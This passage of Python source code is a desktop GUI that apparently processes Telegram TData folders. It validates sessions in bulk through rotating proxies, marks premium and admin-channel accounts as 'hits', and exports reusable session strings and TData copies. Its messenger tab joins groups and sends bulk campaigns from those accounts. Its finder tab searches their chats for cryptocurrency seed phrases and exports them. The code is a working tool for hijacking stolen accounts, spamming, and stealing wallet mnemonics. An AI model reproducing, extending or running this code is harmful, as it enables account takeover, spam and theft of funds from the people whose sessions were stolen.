                command=lambda k=key: self._show_tab(k))
            btn.grid(row=2+i, column=0, padx=15, pady=5, sticky="ew")
            self.tab_btns[key] = btn

        # Language
        ctk.CTkLabel(self.sidebar, text=self.t('language'), font=ctk.CTkFont(size=12)
            ).grid(row=7, column=0, padx=15, pady=(10,2))
        self.lang_cb = ctk.CTkComboBox(self.sidebar, values=list(LANG_LABELS.values()),
            command=self._change_lang, width=170)
        self.lang_cb.set(LANG_LABELS.get(self.lang_code, '🇬🇧 English'))
        self.lang_cb.grid(row=8, column=0, padx=15, pady=(0,20))

        # Main area
        self.main = ctk.CTkFrame(self)
        self.main.grid(row=0, column=1, sticky="nsew")
        self.main.grid_rowconfigure(0, weight=1)
        self.main.grid_columnconfigure(0, weight=1)

        self.frames = {}
        for key in ['checker','accounts','messenger','finder']:
            f = ctk.CTkFrame(self.main)
            self.frames[key] = f
            getattr(self, f'_build_{key}')(f)

    def _show_tab(self, key):
        for k, f in self.frames.items():
            f.grid_forget()
        self.frames[key].grid(row=0, column=0, sticky="nsew")
        for k, b in self.tab_btns.items():
            b.configure(fg_color=["#3B8ED0","#1F6AA5"] if k==key else "transparent")
        if key == 'accounts':
            self._refresh_accounts_list()

    # ── CHECKER TAB ───────────────────────────────────────────────
    def _build_checker(self, parent):
        parent.grid_rowconfigure(3, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        # Info bar
        ctk.CTkLabel(parent, text=self.t('checker_info'), font=ctk.CTkFont(size=12),
            text_color="gray", wraplength=900, anchor="w"
            ).grid(row=0, column=0, sticky="w", padx=20, pady=(15,5))

        # Controls
        ctrl = ctk.CTkFrame(parent)
        ctrl.grid(row=1, column=0, sticky="ew", padx=20, pady=5)
        ctrl.grid_columnconfigure(1, weight=1)

        ctk.CTkButton(ctrl, text="📁 "+self.t('select_folder'), command=self._sel_folder,
            height=40, width=200, font=ctk.CTkFont(size=13, weight="bold")
            ).grid(row=0, column=0, padx=(0,10))
        self.folder_lbl = ctk.CTkLabel(ctrl, text="—", font=ctk.CTkFont(size=12), anchor="w")
        self.folder_lbl.grid(row=0, column=1, sticky="w")

        self.start_btn = ctk.CTkButton(ctrl, text="▶️ "+self.t('start'), command=self._toggle_check,
            height=40, width=180, font=ctk.CTkFont(size=14, weight="bold"),
            fg_color="#27ae60", hover_color="#229954")
        self.start_btn.grid(row=0, column=2, padx=(10,0))

        # Settings row
        srow = ctk.CTkFrame(ctrl, fg_color="transparent")
        srow.grid(row=1, column=0, columnspan=3, sticky="ew", pady=(10,0))

        # Threads
        ctk.CTkLabel(srow, text=self.t('threads')+":", font=ctk.CTkFont(size=12)).pack(side="left")
        self.thr_slider = ctk.CTkSlider(srow, from_=1, to=15, number_of_steps=14, width=120,
            command=lambda v: self.thr_lbl.configure(text=str(int(v))))
        self.thr_slider.set(int(self.db.get('threads','5')))
        self.thr_slider.pack(side="left", padx=5)
        self.thr_lbl = ctk.CTkLabel(srow, text=str(int(self.thr_slider.get())),
            font=ctk.CTkFont(size=12, weight="bold"), width=25)
        self.thr_lbl.pack(side="left")

        self.deep_var = tk.BooleanVar(value=True)
        ctk.CTkCheckBox(srow, text=self.t('deep_scan'), variable=self.deep_var,
            font=ctk.CTkFont(size=12)).pack(side="left", padx=15)

        ctk.CTkLabel(srow, text="🔑 "+self.t('passcode')+":", font=ctk.CTkFont(size=12)).pack(side="left", padx=(15,5))
        self.pass_entry = ctk.CTkEntry(srow, width=100, placeholder_text="(optional)", font=ctk.CTkFont(size=12))
        self.pass_entry.pack(side="left")

        ctk.CTkButton(srow, text="🌐 Proxy", command=self._sel_proxy, width=80,
            font=ctk.CTkFont(size=11)).pack(side="left", padx=(15,0))
        self.proxy_lbl = ctk.CTkLabel(srow, text="—", font=ctk.CTkFont(size=11), text_color="gray")
        self.proxy_lbl.pack(side="left", padx=5)

        # Stats
        sf = ctk.CTkFrame(parent)
        sf.grid(row=2, column=0, sticky="ew", padx=20, pady=5)
        sf.grid_columnconfigure((0,1,2,3), weight=1)
        self.stat_w = {}
        for i,(k,c) in enumerate([('total','#3498db'),('valid','#27ae60'),('invalid','#e74c3c'),('2fa','#f39c12')]):
            fr = ctk.CTkFrame(sf, fg_color=c, corner_radius=10)
            fr.grid(row=0, column=i, padx=6, pady=8, sticky="ew")
            ctk.CTkLabel(fr, text=self.t(k), font=ctk.CTkFont(size=11), text_color="white").pack(pady=(8,2))
            v = ctk.CTkLabel(fr, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="white")
            v.pack(pady=(0,8))
            self.stat_w[k] = v

        # Results log (clean format)
        rf = ctk.CTkFrame(parent)
        rf.grid(row=3, column=0, sticky="nsew", padx=20, pady=(5,10))
        rf.grid_rowconfigure(0, weight=1); rf.grid_columnconfigure(0, weight=1)
        self.check_log = ctk.CTkTextbox(rf, font=ctk.CTkFont(family="Consolas", size=11), wrap="none")
        self.check_log.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)

        # Bottom buttons
        bf = ctk.CTkFrame(parent, fg_color="transparent")
        bf.grid(row=4, column=0, sticky="ew", padx=20, pady=(0,10))
        ctk.CTkButton(bf, text="💾 "+self.t('export'), command=self._export_hits, height=36,
            font=ctk.CTkFont(size=12, weight="bold")).pack(side="left", padx=3)
        ctk.CTkButton(bf, text="🔄 To .session", command=self._export_sessions, height=36,
            font=ctk.CTkFont(size=12, weight="bold"), fg_color="#8e44ad").pack(side="left", padx=3)
        ctk.CTkButton(bf, text="🗑️ "+self.t('clear'), command=self._clear_results, height=36,
            fg_color="#7f8c8d", font=ctk.CTkFont(size=12)).pack(side="right", padx=3)

    # ── ACCOUNTS TAB ──────────────────────────────────────────────
    def _build_accounts(self, parent):
        parent.grid_rowconfigure(2, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(parent, text=self.t('accounts_info'), font=ctk.CTkFont(size=12),
            text_color="gray", wraplength=900, anchor="w"
            ).grid(row=0, column=0, sticky="w", padx=20, pady=(15,5))

        # Filters
        ff = ctk.CTkFrame(parent)
        ff.grid(row=1, column=0, sticky="ew", padx=20, pady=5)
        self.flt_prem = tk.BooleanVar()
        self.flt_chats = tk.BooleanVar()
        self.flt_nospam = tk.BooleanVar()
        ctk.CTkCheckBox(ff, text=self.t('filter_premium'), variable=self.flt_prem,
            command=self._refresh_accounts_list).pack(side="left", padx=10)
        ctk.CTkCheckBox(ff, text=self.t('filter_has_chats'), variable=self.flt_chats,
            command=self._refresh_accounts_list).pack(side="left", padx=10)
        ctk.CTkCheckBox(ff, text=self.t('filter_no_spam'), variable=self.flt_nospam,
            command=self._refresh_accounts_list).pack(side="left", padx=10)
        ctk.CTkButton(ff, text="🔄 Refresh", command=self._refresh_accounts_list, width=90).pack(side="right", padx=10)

        # Account list (scrollable)
        self.acc_scroll = ctk.CTkScrollableFrame(parent)
        self.acc_scroll.grid(row=2, column=0, sticky="nsew", padx=20, pady=(5,10))
        self.acc_scroll.grid_columnconfigure(0, weight=1)
        self.acc_widgets = []

    def _refresh_accounts_list(self):
        for w in self.acc_widgets:
            w.destroy()
        self.acc_widgets.clear()

        filters = {}
        if self.flt_prem.get(): filters['premium'] = True
        if self.flt_chats.get(): filters['has_chats'] = True
        if self.flt_nospam.get(): filters['no_spam'] = True

        accs = self.db.get_accounts(status='valid,hit', filters=filters)

        if not accs:
            lbl = ctk.CTkLabel(self.acc_scroll, text=self.t('no_accounts'), font=ctk.CTkFont(size=14))
            lbl.grid(row=0, column=0, pady=30)
            self.acc_widgets.append(lbl)
            return

        for i, acc in enumerate(accs):
            row = ctk.CTkFrame(self.acc_scroll, fg_color=("#e8f4fd","#1a2332"), corner_radius=8)
            row.grid(row=i, column=0, sticky="ew", pady=3, padx=5)
            row.grid_columnconfigure(1, weight=1)

            phone = acc['phone'] or f"ID:{acc['user_id']}"
            name = acc['first_name'] or "—"
            prem = "👑" if acc['is_premium'] else ""
            spam = "⚠️" if acc['is_spam'] else ""
            tfa = "🔐" if acc['has_2fa'] else ""

            info = f"{phone}  |  {name} {prem}{spam}{tfa}  |  💬 {acc['total_dialogs']}  |  ⭐ {acc['stars']}"
            ctk.CTkLabel(row, text=info, font=ctk.CTkFont(size=13), anchor="w"
                ).grid(row=0, column=0, columnspan=2, sticky="w", padx=12, pady=8)

            ctk.CTkButton(row, text="📋 "+self.t('details'), width=90, height=30,
                font=ctk.CTkFont(size=11), command=lambda a=acc: self._show_detail(a)
                ).grid(row=0, column=2, padx=5, pady=5)
            ctk.CTkButton(row, text="💾", width=40, height=30,
                font=ctk.CTkFont(size=11), fg_color="#27ae60",
                command=lambda a=acc: self._download_tdata(a)
                ).grid(row=0, column=3, padx=(0,8), pady=5)

            self.acc_widgets.append(row)

    def _show_detail(self, acc):
        win = ctk.CTkToplevel(self)
        win.title(f"Account: {acc['phone'] or acc['user_id']}")
        win.geometry("500x550")
        win.grab_set()

        sf = ctk.CTkScrollableFrame(win)
        sf.pack(fill="both", expand=True, padx=15, pady=15)

        fields = [
            ("Phone", acc['phone']), ("ID", acc['user_id']), ("Username", acc['username']),
            ("Name", f"{acc['first_name'] or ''} {acc['last_name'] or ''}".strip()),
            ("Premium", "✅" if acc['is_premium'] else "❌"),
            ("2FA", "✅" if acc['has_2fa'] else "❌"),
            ("Spam", "⚠️ Yes" if acc['is_spam'] else "✅ No"),
            ("Dialogs", acc['total_dialogs']), ("Stars", acc['stars']),
            ("Bio", acc['bio'] or "—"), ("DC", acc['dc_id']),
            ("Admin Channels", acc['admin_channels'] or "—"),
        ]
        for label, val in fields:
            f = ctk.CTkFrame(sf, fg_color="transparent")
            f.pack(fill="x", pady=2)
            ctk.CTkLabel(f, text=f"{label}:", font=ctk.CTkFont(size=12, weight="bold"), width=120, anchor="e").pack(side="left")
            ctk.CTkLabel(f, text=str(val)[:80], font=ctk.CTkFont(size=12), anchor="w", wraplength=300).pack(side="left", padx=10)

        if acc['session_string']:
            ctk.CTkButton(sf, text="📋 Copy Session String", height=35,
                command=lambda: (self.clipboard_clear(), self.clipboard_append(acc['session_string']))
                ).pack(pady=10)

    def _download_tdata(self, acc):
        if not acc['tdata_path'] or not Path(acc['tdata_path']).exists():
            messagebox.showerror("Error", "TData path not available")
            return
        dest = filedialog.askdirectory(title="Save TData to...")
        if not dest: return
        try:
            name = (acc['phone'] or str(acc['user_id'])).replace('+','')
            target = Path(dest)/f"tdata_{name}"
            shutil.copytree(acc['tdata_path'], target, dirs_exist_ok=True)
            messagebox.showinfo("Done", f"Saved to {target}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    # ── MESSENGER TAB ─────────────────────────────────────────────
    def _build_messenger(self, parent):
        parent.grid_rowconfigure(1, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(parent, text=self.t('messenger_info'), font=ctk.CTkFont(size=12),
            text_color="gray", wraplength=900, anchor="w"
            ).grid(row=0, column=0, sticky="w", padx=20, pady=(15,5))

        content = ctk.CTkFrame(parent)
        content.grid(row=1, column=0, sticky="nsew", padx=20, pady=5)
        content.grid_columnconfigure((0,1), weight=1)
        content.grid_rowconfigure(1, weight=1)

        # Left: Account + Message
        left = ctk.CTkFrame(content)
        left.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=(0,8))
        left.grid_rowconfigure(2, weight=1)
        left.grid_columnconfigure(0, weight=1)

        # Account selector
        af = ctk.CTkFrame(left)
        af.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
        ctk.CTkLabel(af, text=self.t('select_account'), font=ctk.CTkFont(size=13, weight="bold")).pack(anchor="w")
        self.msg_acc_cb = ctk.CTkComboBox(af, values=["—"], width=300)
        self.msg_acc_cb.pack(fill="x", pady=5)
        ctk.CTkButton(af, text="🔄", width=35, command=self._refresh_msg_accounts).pack(anchor="e")

        # Message
        ctk.CTkLabel(left, text="📝 "+self.t('message'), font=ctk.CTkFont(size=13, weight="bold")
            ).grid(row=1, column=0, sticky="w", padx=10)
        self.msg_text = ctk.CTkTextbox(left, font=ctk.CTkFont(size=12), wrap="word")
        self.msg_text.grid(row=2, column=0, sticky="nsew", padx=10, pady=(0,5))

        # Photo + Settings
        sf = ctk.CTkFrame(left)
        sf.grid(row=3, column=0, sticky="ew", padx=10, pady=(0,10))
        self.photo_btn = ctk.CTkButton(sf, text="📷 "+self.t('add_photo'), command=self._sel_photo, width=130)
        self.photo_btn.pack(side="left", padx=5)
        self.photo_lbl = ctk.CTkLabel(sf, text="—", text_color="gray", font=ctk.CTkFont(size=11))
        self.photo_lbl.pack(side="left", padx=10)
        ctk.CTkLabel(sf, text=self.t('cooldown')+":", font=ctk.CTkFont(size=11)).pack(side="left", padx=(20,5))
        self.cd_entry = ctk.CTkEntry(sf, width=50, font=ctk.CTkFont(size=11)); self.cd_entry.insert(0,"60")
        self.cd_entry.pack(side="left")
        ctk.CTkLabel(sf, text=self.t('typing_delay')+":", font=ctk.CTkFont(size=11)).pack(side="left", padx=(15,5))
        self.td_entry = ctk.CTkEntry(sf, width=40, font=ctk.CTkFont(size=11)); self.td_entry.insert(0,"3")
        self.td_entry.pack(side="left")

        # Right: Groups
        right = ctk.CTkFrame(content)
        right.grid(row=0, column=1, rowspan=2, sticky="nsew")
        right.grid_rowconfigure(2, weight=1)
        right.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(right, text="👥 "+self.t('target_groups'), font=ctk.CTkFont(size=13, weight="bold")
            ).grid(row=0, column=0, sticky="w", padx=10, pady=(10,0))

        gbtn_f = ctk.CTkFrame(right, fg_color="transparent")
        gbtn_f.grid(row=1, column=0, sticky="ew", padx=10, pady=5)
        ctk.CTkButton(gbtn_f, text="🔄 "+self.t('fetch_groups'), command=self._fetch_groups, width=130,
            font=ctk.CTkFont(size=11)).pack(side="left", padx=3)
        ctk.CTkButton(gbtn_f, text="➕ "+self.t('join_groups'), command=self._join_groups_dialog, width=130,
            font=ctk.CTkFont(size=11), fg_color="#e67e22").pack(side="left", padx=3)

        self.grp_text = ctk.CTkTextbox(right, font=ctk.CTkFont(family="Consolas", size=11))
        self.grp_text.grid(row=2, column=0, sticky="nsew", padx=10, pady=(0,10))

        # Messenger log
        self.msg_log = ctk.CTkTextbox(right, font=ctk.CTkFont(family="Consolas", size=10), height=80)
        self.msg_log.grid(row=3, column=0, sticky="ew", padx=10, pady=(0,10))

        # Send button
        sf2 = ctk.CTkFrame(parent, fg_color="transparent")
        sf2.grid(row=2, column=0, sticky="ew", padx=20, pady=(0,10))
        self.send_btn = ctk.CTkButton(sf2, text="🚀 "+self.t('send'), height=45,
            font=ctk.CTkFont(size=15, weight="bold"), fg_color="#e74c3c", hover_color="#c0392b",
            command=self._start_send)
        self.send_btn.pack(fill="x")

    # ── FINDER TAB ────────────────────────────────────────────────
    def _build_finder(self, parent):
        parent.grid_rowconfigure(2, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(parent, text=self.t('finder_info'), font=ctk.CTkFont(size=12),
            text_color="gray", wraplength=900, anchor="w"
            ).grid(row=0, column=0, sticky="w", padx=20, pady=(15,5))

        ctrl = ctk.CTkFrame(parent)
        ctrl.grid(row=1, column=0, sticky="ew", padx=20, pady=5)
        ctk.CTkLabel(ctrl, text=self.t('select_account')+":", font=ctk.CTkFont(size=13)).pack(side="left", padx=10)
        self.find_acc_cb = ctk.CTkComboBox(ctrl, values=["—"], width=300)
        self.find_acc_cb.pack(side="left", padx=5)
        ctk.CTkButton(ctrl, text="🔄", width=35, command=self._refresh_finder_accounts).pack(side="left")

        self.scan_btn = ctk.CTkButton(ctrl, text="🔍 "+self.t('scan_mnemonics'),
            command=self._start_scan, height=38, font=ctk.CTkFont(size=13, weight="bold"),
            fg_color="#9b59b6", hover_color="#8e44ad")
        self.scan_btn.pack(side="left", padx=15)

        ctk.CTkButton(ctrl, text="💾 Export", command=self._export_mnemonics, height=38,
            font=ctk.CTkFont(size=12), fg_color="#27ae60").pack(side="left", padx=5)

        self.find_log = ctk.CTkTextbox(parent, font=ctk.CTkFont(family="Consolas", size=11))
        self.find_log.grid(row=2, column=0, sticky="nsew", padx=20, pady=(5,10))

    # ── CHECKER LOGIC ─────────────────────────────────────────────
    def _sel_folder(self):
        f = filedialog.askdirectory(title="Select TData Root")
        if f:
            self.selected_folders = [f]
            self.folder_lbl.configure(text=Path(f).name)

    def _sel_proxy(self):
        f = filedialog.askopenfilename(title="Proxy File", filetypes=[("Text","*.txt")])
        if f:
            self.proxy_file = f
            self.proxy_lbl.configure(text=Path(f).name)

    def _load_proxies(self):
        """Load proxies from file. Format: type://user:pass@host:port or host:port:user:pass"""
        if not self.proxy_file or not Path(self.proxy_file).exists():
            return []
        proxies = []
        try:
            for line in Path(self.proxy_file).read_text().strip().split('\n'):
                line = line.strip()
                if not line or line.startswith('#'): continue
                # Parse socks5://user:pass@host:port
                if '://' in line:
                    proto = line.split('://')[0]
                    rest = line.split('://')[1]
                    ptype = 2 if 'socks5' in proto else (1 if 'socks4' in proto else 3)
                    if '@' in rest:
                        cred, hp = rest.rsplit('@',1)
                        user, pw = cred.split(':',1) if ':' in cred else (cred,'')
                        host, port = hp.rsplit(':',1)
                        proxies.append((ptype, host, int(port), True, user, pw))
                    else:
                        host, port = rest.rsplit(':',1)
                        proxies.append((ptype, host, int(port)))
                # Parse host:port or host:port:user:pass
                elif ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        proxies.append((2, parts[0], int(parts[1])))
                    elif len(parts) >= 4:
                        proxies.append((2, parts[0], int(parts[1]), True, parts[2], parts[3]))
        except Exception as e:
            logger.error(f"Proxy parse error: {e}")
        return proxies

    def _toggle_check(self):
        if not self._check_lock.acquire(blocking=False): return
        try:
            if not self.checking:
                if not self.selected_folders:
                    messagebox.showerror("Error", "Select a folder first!"); return
                self._start_check()
            else:
                self._stop_check()
        finally:
            self._check_lock.release()

    def _start_check(self):
        self.checking = True
        self.proc.stop.clear()
        self.start_btn.configure(text="⏹️ "+self.t('stop'), fg_color="#e74c3c", state="disabled")
        self.after(500, lambda: self.start_btn.configure(state="normal"))
        self.db.set('threads', str(int(self.thr_slider.get())))
        threading.Thread(target=self._check_worker, daemon=True).start()

    def _stop_check(self):
        self.checking = False
        self.proc.stop.set()
        self.start_btn.configure(text="▶️ "+self.t('start'), fg_color="#27ae60")

    def _check_worker(self):
        try:
            self._add_check_log("📂 Scanning...")
            folders = []
            for r in self.selected_folders:
                folders.extend(self.proc.find_tdata(r, self.deep_var.get()))
            if not folders:
                self._add_check_log("❌ No TData found!"); self.after(100, self._stop_check); return
            self._add_check_log(f"📂 Found {len(folders)} TData folder(s)")

            threads = int(self.thr_slider.get())
            passcode = self.pass_entry.get().strip()
            proxies = self._load_proxies()

            with ThreadPoolExecutor(max_workers=threads) as ex:
                futs = {}
                for i, f in enumerate(folders):
                    proxy = proxies[i % len(proxies)] if proxies else None
                    futs[ex.submit(self.proc.check_sync, f, passcode=passcode, proxy=proxy)] = f
                done = 0; valid_count = 0
                for fut in as_completed(futs):
                    if not self.checking: break
                    done += 1
                    try:
                        acc = fut.result(timeout=35)
                        if acc.is_valid:
                            valid_count += 1
                            # Log FIRST, then DB (DB might fail on old schema)
                            prem = "✅" if acc.is_premium else "❌"
                            tfa = "✅" if acc.has_2fa else "❌"
                            phone = acc.phone or f"ID:{acc.user_id}"
                            name = acc.first_name or "—"
                            admin = len(acc.admin_channels)
                            self._add_check_log(
                                f"[{done}/{len(folders)}] {phone} | {name} | Premium: {prem} | "
                                f"2FA: {tfa} | Chats: {acc.total_dialogs} | Admin: {admin}"
                            )
                            try: self.db.add_account(acc)
                            except Exception as dbe: logger.error(f"DB add: {dbe}")
                            if acc.is_premium or acc.admin_channels:
                                self._export_single(acc)
                        else:
                            if acc.user_id:
                                try: self.db.add_account(acc)
                                except: pass
                    except Exception as e:
                        logger.error(f"Result error: {e}")
                    # Show progress every 5 folders
                    if done % 5 == 0 or done == len(folders):
                        self._add_check_log(f"⏳ Progress: {done}/{len(folders)} checked, {valid_count} valid")
                    self.after(0, self._update_stats)

            self._add_check_log(f"✅ Done! {done}/{len(folders)} processed")
        except Exception as e:
            self._add_check_log(f"❌ Error: {e}")
        finally:
            if self.checking: self.after(100, self._stop_check)

    def _export_single(self, acc):
        try:
            fn = f"{(acc.phone or str(acc.user_id)).replace('+','')}_{int(time.time())}.json"
            data = asdict(acc); data['last_checked'] = data['last_checked'].isoformat()
            with open(APPDATA/"results"/fn, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            if acc.tdata_path and Path(acc.tdata_path).exists():
                hp = APPDATA/"hits"/Path(acc.tdata_path).parent.name
                try: shutil.copytree(acc.tdata_path, hp, dirs_exist_ok=True)
                except: pass
        except Exception as e:
            logger.error(f"Export error: {e}")

    def _export_hits(self):
        hits = self.db.get_accounts(status='hit')
        if not hits: messagebox.showinfo("Info", "No hits"); return
        d = filedialog.askdirectory(title="Export to")
        if not d: return
        for h in hits:
            fn = f"{h['phone'] or h['user_id']}.json"
            with open(Path(d)/fn, 'w', encoding='utf-8') as f:
                json.dump(dict(h), f, indent=2, ensure_ascii=False)
        messagebox.showinfo("Done", f"Exported {len(hits)} hits")

    def _export_sessions(self):
        """Export all valid accounts as session string files + JSON"""
        accs = self.db.get_accounts(status='valid,hit')
        accs_with_session = [a for a in accs if a['session_string']]
        if not accs_with_session:
            messagebox.showinfo("Info", "No accounts with session data"); return
        d = filedialog.askdirectory(title="Save session files to")
        if not d: return
        count = 0
        for acc in accs_with_session:
            try:
                phone = (acc['phone'] or str(acc['user_id'])).replace('+','')
                # Save session string (can be loaded with StringSession(string))
                with open(Path(d)/f"{phone}.session_string", 'w') as f:
                    f.write(acc['session_string'])
                # Save JSON with full account info
                info = {k: acc[k] for k in ['phone','user_id','username','first_name',
                    'last_name','is_premium','has_2fa','total_dialogs','stars','bio','dc_id']
                    if k in acc.keys()}
                info['session_string'] = acc['session_string']
                with open(Path(d)/f"{phone}.json", 'w', encoding='utf-8') as f:
                    json.dump(info, f, indent=2, ensure_ascii=False)
                count += 1
            except Exception as e:
                logger.error(f"Session export error for {acc.get('phone','?')}: {e}")
        self._add_check_log(f"✅ Exported {count} session + JSON files")
        messagebox.showinfo("Done", f"Exported {count} files to {d}")

    def _clear_results(self):
        self.check_log.delete("1.0", "end")
        self.db.clear()
        self._update_stats()

    def _update_stats(self):
        try:
            s = self.db.get_stats()
            for k in ['total','valid','invalid','2fa']:
                if k in self.stat_w:
                    self.stat_w[k].configure(text=str(s.get(k,0)))
        except: pass

    def _add_check_log(self, msg):
        def _do():
            ts = datetime.now().strftime("%H:%M:%S")
            self.check_log.insert("end", f"[{ts}] {msg}\n")
            self.check_log.see("end")
        if threading.current_thread() is threading.main_thread(): _do()
        else: self.after(0, _do)

    def log_hit(self, msg, level="info"):
        """Only forward scan progress to check log, not individual errors"""
        if any(x in msg for x in ['📂','Found','Done','Scanning']):
            self._add_check_log(msg)

    # ── MESSENGER LOGIC ───────────────────────────────────────────
    def _refresh_msg_accounts(self):
        accs = self.db.get_accounts(status='valid,hit')
        if not accs:
            self.msg_acc_cb.configure(values=["—"]); self.msg_acc_cb.set("—"); return
        opts = [f"{a['phone'] or 'ID:'+str(a['user_id'])} - {a['first_name'] or '?'}" for a in accs]
        self.msg_acc_cb.configure(values=opts)
        if opts: self.msg_acc_cb.set(opts[0])

    def _sel_photo(self):
        p = filedialog.askopenfilename(filetypes=[("Images","*.jpg *.jpeg *.png *.gif *.webp")])
        if p:
            self.selected_photo = p
            self.photo_lbl.configure(text=Path(p).name, text_color="green")

    def _fetch_groups(self):
        acc = self._get_selected_msg_account()
        if not acc or not acc['session_string']:
            self.add_msg_log("⚠️ No account or session selected","warning"); return
        def work():
            loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            try:
                gs=loop.run_until_complete(self.msgr.fetch_groups(acc['session_string']))
                if gs:
                    def _update():
                        self.grp_text.delete("1.0","end")
                        for g in gs:
                            u=f"@{g['username']}"if g['username']else f"ID:{g['id']}"
                            self.grp_text.insert("end", f"{g['title']} ({u}) → {g['members']} members\n")
                    self.after(0, _update)
                    self.add_msg_log(f"✅ Fetched {len(gs)} groups","success")
                else:
                    self.add_msg_log("ℹ️ No groups found","info")
            except Exception as e: self.add_msg_log(f"❌ {e}","error")
            finally: loop.close()
        threading.Thread(target=work, daemon=True).start()

    def _join_groups_dialog(self):
        win = ctk.CTkToplevel(self)
        win.title("Join Groups")
        win.geometry("450x400")
        win.grab_set()
        ctk.CTkLabel(win, text="Paste group URLs (one per line):", font=ctk.CTkFont(size=13)).pack(pady=10)
        urls_text = ctk.CTkTextbox(win, font=ctk.CTkFont(size=12), height=200)
        urls_text.pack(fill="both", expand=True, padx=15, pady=5)
        ctk.CTkLabel(win, text="Interval between joins (seconds):", font=ctk.CTkFont(size=12)).pack()
        iv_entry = ctk.CTkEntry(win, width=80); iv_entry.insert(0, "300"); iv_entry.pack(pady=5)

        def start_join():
            acc = self._get_selected_msg_account()
            if not acc or not acc['session_string']:
                messagebox.showerror("Error", "Select account with session"); return
            urls = [u.strip() for u in urls_text.get("1.0","end").strip().split('\n') if u.strip()]
            if not urls: messagebox.showwarning("Warning", "No URLs"); return
            try: iv = max(10, int(iv_entry.get()))
            except ValueError: iv = 300
            win.destroy()
            def work():
                loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
                try: loop.run_until_complete(self.msgr.join_groups(acc['session_string'], urls, iv))
                finally: loop.close()
            threading.Thread(target=work, daemon=True).start()

        ctk.CTkButton(win, text="🚀 Start Joining", command=start_join, height=40,
            fg_color="#e67e22", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=10)

    def _start_send(self):
        acc = self._get_selected_msg_account()
        if not acc or not acc['session_string']:
            messagebox.showerror("Error", "No account or session"); return
        msg = self.msg_text.get("1.0","end-1c").strip()
        if not msg: messagebox.showwarning("Warning", "Empty message"); return
        gt = self.grp_text.get("1.0","end-1c").strip()
        if not gt: messagebox.showwarning("Warning", "No groups"); return

        groups = []
        for line in gt.split('\n'):
            line = line.strip()
            if not line: continue
            if '@' in line:
                groups.append(line.split('@')[1].split(')')[0].strip())
            elif 'ID:' in line:
                try: groups.append(int(line.split('ID:')[1].split(')')[0].strip()))
                except: pass
            elif 't.me/' in line:
                groups.append(line.split('t.me/')[-1].split('?')[0].strip())
        if not groups: messagebox.showwarning("Warning", "Cannot parse groups"); return

        try: cd = max(1, int(self.cd_entry.get()))
        except ValueError: cd = 60
        try: td_val = max(1, int(self.td_entry.get()))
        except ValueError: td_val = 3
        if not messagebox.askyesno("Confirm", f"Send to {len(groups)} groups?"): return

        def work():
            loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(self.msgr.send_campaign(
                    acc['session_string'], groups, msg, self.selected_photo, cd, td_val))
            finally: loop.close()
        threading.Thread(target=work, daemon=True).start()

    def _get_selected_msg_account(self):
        sel = self.msg_acc_cb.get()
        if not sel or sel == "—": return None
        phone = sel.split(" - ")[0].strip()
        for acc in self.db.get_accounts(status='valid,hit'):
            if acc['phone'] == phone or f"ID:{acc['user_id']}" == phone:
                return acc
        return None

    def add_msg_log(self, msg, level="info"):
        def _do():
            ts = datetime.now().strftime("%H:%M:%S")
            self.msg_log.insert("end", f"[{ts}] {msg}\n")
            self.msg_log.see("end")
        if threading.current_thread() is threading.main_thread(): _do()
        else: self.after(0, _do)

    # ── FINDER LOGIC ──────────────────────────────────────────────
    def _refresh_finder_accounts(self):
        accs = self.db.get_accounts(status='valid,hit')
        if not accs:
            self.find_acc_cb.configure(values=["—"]); self.find_acc_cb.set("—"); return
        opts = ["ALL"] + [f"{a['phone'] or 'ID:'+str(a['user_id'])}" for a in accs]
        self.find_acc_cb.configure(values=opts)
        self.find_acc_cb.set(opts[0])

    def _start_scan(self):
        sel = self.find_acc_cb.get()
        if sel == "—": messagebox.showwarning("Warning", "No accounts"); return

        accs = self.db.get_accounts(status='valid,hit')
        if sel != "ALL":
            accs = [a for a in accs if a['phone']==sel or f"ID:{a['user_id']}"==sel]

        self.find_log.delete("1.0","end")
        self.found_mnemonics = []
        self._add_find_log("🔍 Starting mnemonic scan...")

        def work():
            loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            for acc in accs:
                if not acc['session_string']: continue
                try:
                    results = loop.run_until_complete(
                        MnemonicFinder.scan_account(acc['session_string'], log_fn=self._add_find_log))
                    self.found_mnemonics.extend(results)
                    if results:
                        fn = APPDATA/"results"/f"mnemonics_{acc['phone'] or acc['user_id']}_{int(time.time())}.json"
                        with open(fn, 'w') as f:
                            json.dump(results, f, indent=2)
                except Exception as e:
                    self._add_find_log(f"❌ Error: {e}", "error")
            self._add_find_log(f"✅ Scan complete! Found {len(self.found_mnemonics)} potential mnemonics")
            if self.found_mnemonics:
                self._add_find_log(f"💾 Auto-saved to {APPDATA/'results'}")
            loop.close()
        threading.Thread(target=work, daemon=True).start()

    def _export_mnemonics(self):
        """Export found mnemonics to user-chosen location"""
        if not self.found_mnemonics:
            # Try loading from auto-saved files
            for f in sorted((APPDATA/"results").glob("mnemonics_*.json"), reverse=True):
                try:
                    with open(f) as fh:
                        self.found_mnemonics.extend(json.load(fh))
                except: pass
        if not self.found_mnemonics:
            messagebox.showinfo("Info", "No mnemonics found yet. Run a scan first."); return
        
        path = filedialog.asksaveasfilename(title="Save Mnemonics",
            defaultextension=".json", filetypes=[("JSON","*.json"),("Text","*.txt")])
        if not path: return
        
        if path.endswith('.txt'):
            with open(path, 'w', encoding='utf-8') as f:
                for m in self.found_mnemonics:
                    f.write(f"Chat: {m.get('chat','?')} | Date: {m.get('date','?')}\n")
                    f.write(f"Phrase: {m.get('phrase','')}\n\n")
        else:
